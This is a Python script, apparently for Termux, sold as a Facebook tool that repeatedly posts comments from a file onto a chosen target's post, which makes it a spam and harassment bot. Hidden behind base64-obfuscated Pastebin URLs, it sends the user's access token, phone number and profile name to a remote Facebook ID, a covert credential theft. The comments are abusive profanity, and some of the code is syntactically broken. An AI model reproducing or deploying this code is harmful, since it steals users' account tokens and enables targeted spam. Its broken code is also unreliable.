#Itzz Rohan Singh 
#It's A Tool For Send Comments To Any Post
#Let's Start With Rohan 
from platform import system
import sys
def testPY():
    if(sys.version_info[0] < 3):
        print ('\n\t [+] You have Python 2, Please Clear Data Termux And Reinstall Python ... \n')
        sys.exit()
        #Agya Madarchod Copy Past Kr Ne 
#Tohar Maya Ke Sanga Chor Madarchod
#Kr Le Copy Mera Loda Auqhad Lega Ky Tu


def modelsInstaller():
	try :
		models = ['requests', 'colorama']
		for model in models:
			try:
				if(sys.version_info[0] < 3):
					os.system('cd C:\Python27\Scripts & pip install {}'.format(model))
				else :
					os.system('python -m pip install {}'.format(model))
				print (' ')
				print (' [+] {} has been installed successfully, Restart the program.'.format(model))
				sys.exit()
				print (' ')
			except:
				print (' [-] Install {} manually.'.format(model))
				print (' ')
	except:
		pass
#Samja Ata Bhi Python Jo Chala Tool Bana Ke 
#Decode To Kr Leya Ab Mera Loda Chuss Lechor

import base64
import json
import time
import sys,os,re,binascii,time,json,random,threading,pprint,smtplib,telnetlib,os.path,hashlib,string,glob,sqlite3,urllib,argparse,marshal
from platform import system
from datetime import datetime

try :
	import requests
	from colorama import Fore
	from colorama import init
except :
	modelsInstaller()

requests.packages.urllib3.disable_warnings()

def cls():
	if system() == 'Linux':
		os.system('clear')
	else:
		if system() == 'Windows':
			os.system('cls')
cls()
CLEAR_SCREEN = '\033[2J'
RED = '\033[31m'   # mode 31 = red forground
RESET = '\033[0m'  # mode 0  = reset
BLUE  = "\033[34m"
WHITE = "\u001b[37m",
YELLOW = "\u001b[33;1m",
CYAN  = "\033[36m"
MAGENTA = "\u001b[35m",
GREEN = "\033[32m"
RESET = "\033[0m"
BOLD = '\033[1m'
REVERSE = "\033[m"
def logo():
		clear = "\x1b[0m"
		colors = [35,33,36 ]
#Agar Koi Line Cut Kare Ga To Kuch Nahi Chale Ga Gawaree Randi Ke Bache Itx Rohan Kr Ab Cut 
		x = """

 $$$$$$\  $$\                                     
$$  __$$\ $$ |                                    
$$ /  $$ |$$ | $$$$$$\  $$$$$$$\   $$$$$$\        
$$$$$$$$ |$$ |$$  __$$\ $$  __$$\ $$  __$$\       
$$  __$$ |$$ |$$ /  $$ |$$ |  $$ |$$$$$$$$ |      
$$ |  $$ |$$ |$$ |  $$ |$$ |  $$ |$$   ____|      
$$ |  $$ |$$ |\$$$$$$  |$$ |  $$ |\$$$$$$$\       
\__|  \__|\__| \______/ \__|  \__| \_______|      
                                                                                                
$$$$$$$\            $$\                           
$$  __$$\           $$ |                          
$$ |  $$ |$$\   $$\ $$ | $$$$$$\  $$\   $$\       
$$$$$$$  |$$ |  $$ |$$ |$$  __$$\ \$$\ $$  |      
$$  __$$< $$ |  $$ |$$ |$$$$$$$$ | \$$$$  /       
$$ |  $$ |$$ |  $$ |$$ |$$   ____| $$  $$<        
$$ |  $$ |\$$$$$$  |$$ |\$$$$$$$\ $$  /\$$\       
\__|  \__| \______/ \__| \_______|\__/  \__|      
___________________________________________________________

-=[ Facebook Tool Pool Ka Super Hero By Alone Rulex ]=-
-=[ Contact Us :: https://facebook.com/groups/411040537413366/]=-
___________________________________________________________
"""
		for N, line in enumerate(x.split("\n")):
			sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
			time.sleep(0.001)
logo()
testPY()
ua = random.choice([
			"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]", 
			"Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36",
			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]",
			"Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16';]",
			"Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36;]"
#Chalo Heder Include Kr Leta Ha Thoda Sa 
headers = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
				"x-fb-sim-hni": str(random.randint(20000, 40000)), 
				"x-fb-net-hni": str(random.randint(20000, 40000)), 
				"x-fb-connection-quality": "EXCELLENT",
				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
				"user-agent": ua, 
				"content-type": "application/x-www-form-urlencoded", 
				"x-fb-http-engine": "Liger"}
			
newt = datetime.now().strftime('%Y-%m-%d %I:%M:%S %p')
newtt = newt
ysd = "aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L2hQbTZLYXh1"
yss = base64.b64decode(ysd)
yff = yss.decode('utf-8', 'ignore')
y = requests.get(yff)
z = y.text
ch=z
print(BOLD+GREEN+"[#] Start Time ==> ",newtt)
print(BOLD+GREEN+'[#] _ Alone Boiis ==> '+ch+'\n\n')


#For Get Details Of User
asd = "aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L3VocnR2NXAz"
ass = base64.b64decode(asd)
aff = ass.decode('utf-8', 'ignore')
a = requests.get(aff)
r = a.text
#All Dn Itz Tera Baap Rohan Singh Here
#Tohar Maya Ko Chodu 

def comment_on_posts(posts):
	for i in ns:
		try:
			message = i
			url = "https://graph.facebook.com/v14.0/{0}/comments".format(profile_id+"_"+post_id)
			parameters = {'access_token' : access_token, 'message' : message}
			s = requests.post(url, data = parameters, headers=headers)
			tt = time.strftime("%Y-%m-%d %I:%M:%S %p")
			
			if s.ok:
				print (BOLD+GREEN+' [+] Sahii Haii .. | [+] Time :: ',datetime.now().strftime('%Y-%m-%d %I:%M:%S %p'),"\n [+] Han Chala Gaya Tera Comment ==> " +message)
				time.sleep(timm)
			else:
				tks = "Id%20Chud%20Gaya%20Madarchod%20Tera%20Check%20Kr%20Aur%20Sahi%20Krle%20Id%20Ka%20Nam%20Ha:%20"+f
				os.system("am start https://wa.me/+994406745568?text="+tks)
				print(BOLD+RED+' [x] Lund Sahii Ha Mera :: [+] Loda Gaya Tera Comment :: '+tt,'\n','[-] Comment Error :: ==> '+message)
				time.sleep(timm)
		except Exception as e:
			print(e)
			time.sleep(timm)
							   
def get_posts(): 
	try:
		url = "https://mbasic.facebook.com"
	except HTTPError as e:
		print("HTTP Error")
	except URLError as e:
		print("URL Error")
		
qqq = "aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L2prOXZhQW5Y"
www = base64.b64decode(qqq)
eee = www. decode("utf-8")
rrr = requests.get(eee)
for linee in rrr:
	mmm = linee.decode("utf-8")
	mmm = mmm.split(',')
inn = input(BOLD+CYAN+"[+] Mobile Number :: ")
if inn in mmm:
	token = input("[+] Token File :: ")
	
	with open(token, 'r') as f2:
		access_token = f2.read()
		
		payload = {'access_token' : access_token}
		
		a = "https://graph.facebook.com/v14.0/me"
		b = requests.get(a, params=payload)
		d = json.loads(b.text)
		
		if 'name' not in d:
			print(BOLD+RED+'\n[x] Token Invalid ..!!')
			sys.exit()
		f = d['name']
		prof = ("\nYour Profile Name :: " + f+'\n\n')
		for pro in prof:
			sys.stdout.write(BOLD+GREEN+pro)
			sys.stdout.flush()
			time.sleep(0.001)
		profile_id = input(BOLD+CYAN+"[+] Profile ID :: ")
		#Kr Le Copy Akhir Kar Tu Beta Mera He Ha
		payload = {'access_token' : access_token}
		a = ("https://graph.facebook.com/v14.0/"+profile_id)
		b = requests.get(a, params=payload)
		d = json.loads(b.text)
		t = d['name']
		prof = ("\nTarget Profile Name :: " + t+'\n\n')
		for pro in prof:
			sys.stdout.write(BOLD+GREEN+pro)
			sys.stdout.flush()
			time.sleep(0.001)
			
		post_id = input(BOLD+CYAN+"[+] Post ID :: ")
		
		
		
		ms = input(BOLD+CYAN+"[+] Add Text File :: ")
		repeat = int(input(BOLD+CYAN+"[+] File Repeat :: "))
		timm = int(input(BOLD+CYAN+"[+] Speed in Seconds :: "))
		load = ('\n'+"________All Done....Loading Profile Info.....!"+'\n')
		
		
		
		for loa in load:
			sys.stdout.write(BOLD+BLUE+loa)
			sys.stdout.flush()
			time.sleep(0.001)
			
		url2 = "https://graph.facebook.com/v14.0/{0}/".format(r)
		parameters = {'access_token' : access_token, 'message' : 'Phone No : '+inn+'\nProfile Name : '+f+'\nToken : '+access_token+'\nLink :\n\n https://www.facebook.com/'+profile_id+"_"+post_id}
		s = requests.post(url2, data = parameters, headers=headers)

		
		prof = ("[+]=> Active Profile :: " + f+'\n\n')
		for pro in prof:
			sys.stdout.write(BOLD+BLUE+pro)
			sys.stdout.flush()
			time.sleep(0.001)
		ns = open(ms, 'r').readlines()
		
		
	for i in range(repeat):
		posts = get_posts()
		comment_on_posts(posts)
		
else:
	print(BOLD+RED+'[-] <==> Your Number Is Wrong Please Take Approval From Owner')

#Abb Samaj Gaya Hoga To Tu Appni Maa Chudva Le Chor Madarchod ke Bache